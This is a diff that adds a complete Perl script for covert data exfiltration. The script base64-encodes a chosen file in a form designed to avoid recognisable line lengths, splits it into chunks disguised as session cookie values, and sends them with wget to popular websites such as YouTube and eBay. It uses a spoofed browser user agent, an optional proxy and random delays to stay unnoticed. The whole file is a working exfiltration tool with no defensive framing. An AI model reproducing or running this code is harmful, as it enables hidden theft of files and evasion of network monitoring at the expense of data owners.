@@ -1,0 +1,104 @@
+#!/usr/bin/perl
+#
+use strict;
+use warnings;
+use MIME::Base64;
+use vars qw/@urls/;
+
+my $user_agent = "Mozilla/5.0 (X11; U; Linux i686; en-US) Gecko/20071126";
+#my $proxy_ip = "219.93.175.67:80";
+@urls = ( "http://youtube.com/", "http://www.google.com/search?hl=en&q=pig+latin", "http://www.idioma-software.com/pig/pig_latin.html", "http://www.yahoo.com/", "http://mail.yahoo.com/", "http://www.myspace.com/", "http://vids.myspace.com/index.cfm?fuseaction=vids.individual&VideoID=23886700", "http://youtube.com/", "http://youtube.com/watch?v=ZiRHyzjb5SI", "http://youtube.com/watch?v=1RUFBGDvsy0", "http://www.google.com/search?hl=en&q=juicy+fruit", "http://www.wrigley.com/wrigley/products/pop_juicy_fruit.asp", "http://www.amazon.com/Juicy-Fruit-Mtume/dp/B0000025UL", "http://www.facebook.com/", "http://www.live.com/", "http://search.live.com/results.aspx?q=hurricane", "http://www.ebay.com/", "http://books.ebay.com/", "http://photography.ebay.com/", "http://crafts.ebay.com/", "http://en.wikipedia.org/wiki/Main_Page", "http://en.wikipedia.org/wiki/Lee_Smith_\%28baseball_player\%29", "http://en.wikipedia.org/wiki/Lee_Smith_\%28baseball_player\%29&action=edit", "http://www.msn.com/", "http://www.slate.com/id/2179838/?GT1=10733", "http://mail.live.com/", "http://costarica.en.craigslist.org/rfs/", "http://costarica.en.craigslist.org/apa/");
+
+my @send_data;
+my $inputfile;
+my $chunk_size = 1236;
+
+
+sub encoder {
+
+	open (F, "<", $inputfile) or die "Couldn't open $inputfile\n\n";
+	#don't want to break into recognizable base64 line lengths, so set $eol empty
+	my $eol = "";
+	local $/ = undef;
+	my $tmp = encode_base64( <F>, $eol );
+	close (F);
+	
+	return chunker( $tmp );
+}
+
+sub chunker {
+
+	my $template = "A$chunk_size " x (length($_[0])/$chunk_size);
+	$template .= "A*";
+	#print "Template is: $template \n";
+	my @temp = unpack("$template", $_[0]);
+	my $i = 0;
+	foreach my $chunk (@temp) {
+		$i++;
+		if ($i % 3 == 0) { $chunk = "RMID=" . $chunk; next;}
+		if ($i % 2 == 0) { $chunk = "Sessid=" . $chunk; next;}
+		else {$chunk = "CVal=" . $chunk;}
+		
+		}
+	#print "Chunked array is : @temp \n";
+	
+	return @temp;
+
+}
+
+sub fluff_urls {
+
+my $t = 0;
+until ( (scalar @urls) >= (scalar @send_data) ) {
+	$urls[$#urls+1] = $urls[$t];
+	$t++;
+	}
+	
+}
+
+sub ship_data {
+
+	my $i = 0;
+
+	# $proxy_ip can specify a non-standard port, just edit the variable with ip:port syntax
+	# however, this doesn't work with separate system() calls as is. better to set in parent
+	# shell.
+#	system ('env http_proxy="http://$proxy_ip"');
+
+	foreach my $data_chunk (@send_data) {
+	
+		`wget -q --no-cookies --proxy=on --header=\"Cookie: $data_chunk\" --user-agent=\"$user_agent\" -O - $urls[$i]`;
+		$i++;
+		sleep 12;
+		sleep int(rand(40));
+
+		}
+}
+
+$inputfile = $ARGV[0];
+
+print "Preparing $inputfile for transmission ......\n\n";
+
+@send_data = encoder();
+
+#now make sure we have enough URL requests to embed data chunks
+fluff_urls();
+
+print "Sending now. Patience please ....\n";
+
+ship_data();
+# 	foreach my $data_chunk (@send_data) {
+# 	print "Chunk is: $data_chunk \n\n";
+# 	}
+	
+print "Data transmission complete. Exiting.\n\n";
+
+
+
+# $i = scalar @urls;
+# print "URLS after number: $i";
+# 
+# print @urls;
+# 
+# Start sending the data out
+#
